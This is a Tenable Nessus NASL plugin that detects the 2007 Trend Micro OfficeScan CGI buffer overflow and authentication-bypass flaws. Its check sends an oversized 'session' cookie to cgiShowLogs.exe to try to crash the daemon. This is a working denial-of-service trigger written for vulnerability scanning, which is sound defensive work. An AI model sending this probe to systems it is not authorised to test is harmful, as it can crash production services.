#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25625);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2007-3454", "CVE-2007-3455");
  script_bugtraq_id(24641, 24935);
  script_xref(name:"OSVDB", value:"36628");
  script_xref(name:"OSVDB", value:"36629");

  script_name(english:"Trend Micro OfficeScan Server CGI Modules Multiple Vulnerabilities");
  script_summary(english:"Checks version number");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Trend Micro OfficeScan Server or
Client Server Messaging Security for SMB.

The version of OfficeScan Server or Client Server Messaging Security
for SMB installed on the remote host reportedly contains a buffer
overflow issue that could allow a remote attacker to execute arbitrary
code with the privileges of the web server user id, by default
'SYSTEM'. 

It may also allow an attacker to bypass authentication with
specially-crafted HTTP headers and gain access to the application's
Management Console." );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=558" );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=559" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-07/0318.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-07/0319.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d24cbf16" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?60b18f77" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0ed245af" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f42dc93d" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fae5a0b1" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0ba8ef70" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b4cac3f5" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?976d28fa" );
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate security patch as per the vendor advisories
referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 4343, 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);

# cookie = string(
#   "testCookie=Test; " ,
#   "session=" + crap(data:"1", length:0xe0) + "; " ,
#   "key=; ",
#   "stamp="
# );
data = "";


# Make sure OfficeScan is installed.
r = http_send_recv3(method: "GET", item:"/officescan/", port:port);
if (isnull(r)) exit(0);


# If so...
if ("cgiChkMasterPwd.exe" >< r[2] && 'content="0;URL=' >< r[2])
{
  url = strstr(r[2], 'content="0;URL=') - 'content="0;URL=';
  if (url) url = url - strstr(url, "cgiChkMasterPwd.exe") + "cgiShowLogs.exe";

  if (url)
  {
    # Make sure the affected script exists.
    r = http_send_recv3(method: "GET", item:url, port:port);
    if (isnull(r)) exit(0);

    # If it does...
    if ('document.cookie="retry=0;path=/officescan";' >< r[2])
    {
      # Try to crash the daemon.
      set_http_cookie(name: "testCookie", value: "Test");
      set_http_cookie(name: "session", value: crap(data:"1", length:0xe0));
      set_http_cookie(name: "key", value: "");
      set_http_cookie(name: "stamp", value: "");
# "Cookie: ", cookie, "\r\n",
      r = http_send_recv3(method: "POST", item: url, version: 11, data: data, port: port,  add_headers: make_array("Content-Type", "application/x-www-form-urlencoded") );
      if (isnull(r)) exit(0);

      # There's a problem if we don't see our session cookie.
      if ("HTTP/" >< r[0] && !egrep(pattern:"Set-Cookie: +session=1+;", string:r[1]))
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
